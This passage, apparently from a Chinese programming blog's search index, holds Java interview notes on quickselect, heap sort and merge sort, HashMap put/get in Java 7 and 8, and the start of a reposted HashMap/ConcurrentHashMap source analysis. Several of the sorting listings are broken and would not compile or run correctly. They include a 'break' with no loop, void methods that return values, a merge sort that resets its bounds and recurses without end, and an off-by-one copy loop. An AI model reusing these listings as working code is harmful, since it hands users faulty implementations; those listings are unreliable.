class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    k--;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = qs(a,lo,hi);</span><br><span class="line">       <span class="keyword">if</span>(mid&gt;k)&#123;</span><br><span class="line">           hi=mid-<span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mid==k)&#123;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           lo=mid+<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">qs</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="堆排">堆排</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">heap</span><span class="params">(<span class="keyword">int</span>[] a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = a.length;</span><br><span class="line">    build(a,len);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=len-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=a[<span class="number">0</span>];</span><br><span class="line">        a[<span class="number">0</span>]=a[i];</span><br><span class="line">        a[i]=tmp;</span><br><span class="line">        len--;</span><br><span class="line">        sink(a,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=len/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        sink(a,i,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sink</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> i,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left=i*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> right=<span class="number">2</span>*i+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> present=i;</span><br><span class="line">    <span class="keyword">if</span>(left&lt;len&amp;&amp;a[left]&gt;a[present]) present=left;</span><br><span class="line">    <span class="keyword">if</span>(right&lt;len&amp;&amp;a[right]&gt;a[present]) present=right;</span><br><span class="line">    <span class="keyword">if</span>(present!=i)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=a[i];</span><br><span class="line">        a[i]=a[present];</span><br><span class="line">        a[present]=tmp;</span><br><span class="line">        sink(a,present,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在构建堆的过程中，因为我们是完全二叉树从最下层最右边的非终端结点开始构建，将它与其孩子进行比较和若有必要的互换，对于每个非终端结点来说，其实最多进行两次比较和互换操作，因此整个构建堆的时间复杂度为O(n)。</p><p>在正式排序时，第i次取堆顶记录重建堆需要用O(logi)的时间（完全二叉树的某个结点到根结点的距离为.log2i.＋1），并且需要取n－1次堆顶记录，因此，重建堆的时间复杂度为O(nlogn)。</p><h2><span id="归并排序">归并排序 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> a[])</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> sort(a,<span class="number">0</span>,a.length-<span class="number">1</span>,<span class="keyword">new</span> <span class="keyword">int</span>[a.length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi,<span class="keyword">int</span>[] tmp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">        sort(a,lo,mid,tmp);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi,tmp);</span><br><span class="line">        mergeArray(a,lo,mid,hi,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mergeArray</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> mid,<span class="keyword">int</span> hi,<span class="keyword">int</span>[] tmp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=lo,m=mid,j=mid+<span class="number">1</span>,n=hi,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m&amp;&amp;j&lt;=n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;=a[j])&#123;</span><br><span class="line">            tmp[k++]=a[i++];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp[k++]=a[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m) tmp[k++]=a[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=n) tmp[k++]=a[j++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">0</span>;l&lt;=k;l++)&#123;</span><br><span class="line">        a[l+lo]=tmp[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>公式：T[n]  =  2T[n/2] + O(n)；</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试常考算法题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SourceCode</title>
      <link href="/2020/04/12/SourceCode/"/>
      <url>/2020/04/12/SourceCode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#hashmap">HashMap</a><ul><li><a href="#hashmap-17">HashMap 1.7</a><ul><li><a href="#put-过程分析">put 过程分析</a></li><li><a href="#get-过程分析">get 过程分析</a></li><li><a href="#hashmap扩容死锁问题">HashMap扩容死锁问题</a></li></ul></li><li><a href="#hashmap-18">HashMap 1.8</a><ul><li><a href="#put方法的逻辑">put方法的逻辑</a></li><li><a href="#get方法的逻辑">get方法的逻辑</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="hashmap">HashMap</span></h1><h2><span id="hashmap-17">HashMap 1.7</span></h2><p><strong>数据结构</strong>： 数组+链表</p><p><strong>元素结构：</strong>Entry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Entry&lt;K,V&gt; next;</span><br><span class="line">    <span class="keyword">int</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。</p><p>loadFactor：负载因子，默认为 0.75。</p><p>threshold：扩容的阈值，等于 capacity * loadFactor</p><p>HashMap如果key为null则放入table[0]中</p><p>遍历完链表发现没有key，就需要添加entry。</p><p>添加entry前判断是否需要扩容（如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容）</p><h3><span id="put-过程分析">put 过程分析</span></h3><ol><li>如果HashMap未被初始化，则初始化</li><li>如果key为null，则下标为0</li><li>如果key不为null，计算hash值并找到对应下标</li><li>遍历下标处的链表看是否存在重复key，存在则覆盖。</li><li>不存在的话，判断是否需要扩容。</li><li>不需要扩容就将entry头插法添加到链表中。</li></ol><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 过程，get 过程是非常简单的。</p><ol><li>根据 key 计算 hash 值。</li><li>找到相应的数组下标：hash &amp; (length - 1)。</li><li>遍历该数组位置处的链表，直到找到相等(==或equals)的 key。</li></ol><h3><span id="hashmap扩容死锁问题">HashMap扩容死锁问题</span></h3><p>因为在 JDK1.7 中采取的是<strong>头插法</strong>，遍历一个节点就插入一个节点到新的哈希桶数组，所以才会导致出现循环链表。但 JDK1.8 中是采用<strong>两个头结点来保持旧链表的引用，直到该索引处对应的链表全部遍历完之后再分别把头结点放在新的哈希桶数组对应的位置。</strong>而不是遍历一个节点就插入一个节点到新的哈希桶数组。所以不会出现死链。</p><h2><span id="hashmap-18">HashMap 1.8</span></h2><p>将Entry改名为Node</p><p><strong>Java7 是先扩容后插入新值的，Java8 先插值再扩容</strong></p><p><strong>Java7是头插法，Java8是尾插法</strong></p><h3><span id="put方法的逻辑">put方法的逻辑</span></h3><ol><li><p>如果HashMap未被初始化，则resize初始化</p></li><li><p>对Key求Hash值，然后再计算下标</p></li><li><p>如果没有碰撞，直接放入桶中</p></li><li><p>如果碰撞了，key相等就取出节点</p></li><li><p>如果是红黑树就以红黑树的方式插入节点，如果为链表以链表的方式链接到后面，</p></li><li><p>如果插入后链表长度超过阈值8，就把链表转成红黑树</p></li><li><p>如果节点已经存在就替换旧值</p></li><li><p>如果桶满了（容量16*加载因子0.75），就需要resize（扩容2倍后重排）</p></li></ol><h3><span id="get方法的逻辑">get方法的逻辑</span></h3><ol><li><p>计算 key 的 hash 值，根据 hash 值找到对应数组下标:     hash &amp; (length-1)</p></li><li><p>判断数组该位置处的元素是否刚好就是我们要找的</p></li><li><p>如果不是，判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据。</p><p>4 . 如果不是，遍历链表，直到找到相等(==或equals)的 key。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java7/8 中的 HashMap 和 ConcurrentHashMap 全解析（转）</title>
      <link href="/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天发一篇”水文”，可能很多读者都会表示不理解，不过我想把它作为并发序列文章中不可缺少的一块来介绍。本来以为花不了多少时间的，不过最终还是投入了挺多时间来完成这篇文章的。</p><p>网上关于 HashMap 和 ConcurrentHashMap 的文章确实不少，不过缺斤少两的文章比较多，所以才想自己也写一篇，把细节说清楚说透，尤其像 Java8 中的 ConcurrentHashMap，大部分文章都说不清楚。终归是希望能降低大家学习的成本，不希望大家到处找各种不是很靠谱的文章，看完一篇又一篇，可是还是模模糊糊。</p><p>阅读建议：四节基本上可以进行独立阅读，建议初学者可按照 Java7 HashMap -&gt; Java7 ConcurrentHashMap -&gt; Java8 HashMap -&gt; Java8 ConcurrentHashMap 顺序进行阅读，可适当降低阅读门槛。</p><p>阅读前提：本文分析的是源码，所以至少读者要熟悉它们的接口使用，同时，对于并发，读者至少要知道 CAS、ReentrantLock、UNSAFE 操作这几个基本的知识，文中不会对这些知识进行介绍。Java8 用到了红黑树，不过本文不会进行展开，感兴趣的读者请自行查找相关资料。</p><!-- toc --><ul><li><a href="#java7-hashmap">Java7 HashMap</a><ul><li><a href="#put-过程分析">put 过程分析</a><ul><li><a href="#数组初始化">数组初始化</a></li><li><a href="#计算具体数组位置">计算具体数组位置</a></li><li><a href="#添加节点到链表中">添加节点到链表中</a></li><li><a href="#数组扩容">数组扩容</a></li></ul></li><li><a href="#get-过程分析">get 过程分析</a></li></ul></li><li><a href="#java7-concurrenthashmap">Java7 ConcurrentHashMap</a><ul><li><a href="#初始化">初始化</a></li><li><a href="#put-过程分析-1">put 过程分析</a><ul><li><a href="#初始化槽-ensuresegment">初始化槽: ensureSegment</a></li><li><a href="#获取写入锁-scanandlockforput">获取写入锁: scanAndLockForPut</a></li><li><a href="#扩容-rehash">扩容: rehash</a></li></ul></li><li><a href="#get-过程分析-1">get 过程分析</a></li><li><a href="#并发问题分析">并发问题分析</a></li></ul></li><li><a href="#java8-hashmap">Java8 HashMap</a><ul><li><a href="#put-过程分析-2">put 过程分析</a><ul><li><a href="#数组扩容-1">数组扩容</a></li></ul></li><li><a href="#get-过程分析-2">get 过程分析</a></li></ul></li><li><a href="#java8-concurrenthashmap">Java8 ConcurrentHashMap</a><ul><li><a href="#初始化-1">初始化</a></li><li><a href="#put-过程分析-3">put 过程分析</a><ul><li><a href="#初始化数组inittable">初始化数组：initTable</a></li><li><a href="#链表转红黑树-treeifybin">链表转红黑树: treeifyBin</a></li></ul></li><li><a href="#扩容trypresize">扩容：tryPresize</a><ul><li><a href="#数据迁移transfer">数据迁移：transfer</a></li></ul></li><li><a href="#get-过程分析-3">get 过程分析</a></li></ul></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><h2><span id="java7-hashmap">Java7 HashMap</span></h2><p>HashMap 是最简单的，一来我们非常熟悉，二来就是它不支持并发操作，所以源码也非常简单。</p><p>首先，我们用下面这张图来介绍 HashMap 的结构。</p><p><img src="https://www.javadoop.com/blogimages/map/1.png" alt="1"></p><blockquote><p>这个仅仅是示意图，因为没有考虑到数组要扩容的情况，具体的后面再说。</p></blockquote><p>大方向上，HashMap 里面是一个<strong>数组</strong>，然后数组中每个元素是一个<strong>单向链表</strong>。</p><p>上图中，每个绿色的实体是嵌套类 Entry 的实例，Entry 包含四个属性：key, value, hash 值和用于单向链表的 next。</p><p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。</p><p>loadFactor：负载因子，默认为 0.75。</p><p>threshold：扩容的阈值，等于 capacity * loadFactor</p><h3><span id="put-过程分析">put 过程分析</span></h3><p>还是比较简单的，跟着代码走一遍吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当插入第一个元素的时候，需要先初始化数组大小</span></span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果 key 为 null，感兴趣的可以往里看，最终会将这个 entry 放到 table[0] 中</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">// 1. 求 key 的 hash 值</span></span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="comment">// 2. 找到对应的数组下标</span></span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 3. 遍历一下对应下标处的链表，看是否有重复的 key 已经存在，</span></span><br><span class="line">    <span class="comment">//    如果有，直接覆盖，put 方法返回旧值就结束了</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// 4. 不存在重复的 key，将此 entry 添加到链表中，细节后面说</span></span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="数组初始化">数组初始化</span></h4><p>在第一个元素插入 HashMap 的时候做一次数组的初始化，就是先确定初始的数组大小，并计算数组扩容的阈值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inflateTable</span><span class="params">(<span class="keyword">int</span> toSize)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 保证数组大小一定是 2 的 n 次方。</span></span><br><span class="line">    <span class="comment">// 比如这样初始化：new HashMap(20)，那么处理成初始数组大小是 32</span></span><br><span class="line">    <span class="keyword">int</span> capacity = roundUpToPowerOf2(toSize);</span><br><span class="line">    <span class="comment">// 计算扩容阈值：capacity * loadFactor</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 算是初始化数组吧</span></span><br><span class="line">    table = <span class="keyword">new</span> Entry[capacity];</span><br><span class="line">    initHashSeedAsNeeded(capacity); <span class="comment">//ignore</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个将数组大小保持为 2 的 n 次方的做法，Java7 和 Java8 的 HashMap 和 ConcurrentHashMap 都有相应的要求，只不过实现的代码稍微有些不同，后面再看到的时候就知道了。</p><h4><span id="计算具体数组位置">计算具体数组位置</span></h4><p>这个简单，我们自己也能 YY 一个：使用 key 的 hash 值对数组长度进行取模就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> hash, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert Integer.bitCount(length) == 1 : "length must be a non-zero power of 2";</span></span><br><span class="line">    <span class="keyword">return</span> hash &amp; (length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法很简单，简单说就是取 hash 值的低 n 位。如在数组长度为 32 的时候，其实取的就是 key 的 hash 值的低 5 位，作为它在数组中的下标位置。</p><h4><span id="添加节点到链表中">添加节点到链表中</span></h4><p>找到数组下标后，会先进行 key 判重，如果没有重复，就准备将新值放入到链表的<strong>表头</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEntry</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">int</span> bucketIndex)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容</span></span><br><span class="line">    <span class="keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="keyword">null</span> != table[bucketIndex])) &#123;</span><br><span class="line">        <span class="comment">// 扩容，后面会介绍一下</span></span><br><span class="line">        resize(<span class="number">2</span> * table.length);</span><br><span class="line">        <span class="comment">// 扩容以后，重新计算 hash 值</span></span><br><span class="line">        hash = (<span class="keyword">null</span> != key) ? hash(key) : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 重新计算扩容后的新的下标</span></span><br><span class="line">        bucketIndex = indexFor(hash, table.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 往下看</span></span><br><span class="line">    createEntry(hash, key, value, bucketIndex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这个很简单，其实就是将新值放到链表的表头，然后 size++</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createEntry</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">int</span> bucketIndex)</span> </span>&#123;</span><br><span class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</span><br><span class="line">    table[bucketIndex] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的主要逻辑就是先判断是否需要扩容，需要的话先扩容，然后再将这个新的数据插入到扩容后的数组的相应位置处的链表的表头。</p><h4><span id="数组扩容">数组扩容</span></h4><p>前面我们看到，在插入新值的时候，如果<strong>当前的 size 已经达到了阈值，并且要插入的数组位置上已经有元素</strong>，那么就会触发扩容，扩容后，数组大小为原来的 2 倍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span> </span>&#123;</span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新的数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</span><br><span class="line">    <span class="comment">// 将原来数组中的值迁移到新的更大的数组中</span></span><br><span class="line">    transfer(newTable, initHashSeedAsNeeded(newCapacity));</span><br><span class="line">    table = newTable;</span><br><span class="line">    threshold = (<span class="keyword">int</span>)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扩容就是用一个新的大数组替换原来的小数组，并将原来数组中的值迁移到新的数组中。</p><p>由于是双倍扩容，迁移过程中，会将原来 table[i] 中的链表的所有节点，分拆到新的数组的 newTable[i] 和 newTable[i + oldLength] 位置上。如原来数组长度是 16，那么扩容后，原来 table[0] 处的链表中的所有元素会被分配到新数组中 newTable[0] 和 newTable[16] 这两个位置。代码比较简单，这里就不展开了。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 过程，get 过程是非常简单的。</p><ol><li>根据 key 计算 hash 值。</li><li>找到相应的数组下标：hash &amp; (length - 1)。</li><li>遍历该数组位置处的链表，直到找到相等(==或equals)的 key。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 之前说过，key 为 null 的话，会被放到 table[0]，所以只要遍历下 table[0] 处的链表就可以了</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> getForNullKey();</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Entry&lt;K,V&gt; entry = getEntry(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span> == entry ? <span class="keyword">null</span> : entry.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getEntry(key):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Entry&lt;K,V&gt; <span class="title">getEntry</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> hash = (key == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(key);</span><br><span class="line">    <span class="comment">// 确定数组下标，然后从头开始遍历链表，直到找到为止</span></span><br><span class="line">    <span class="keyword">for</span> 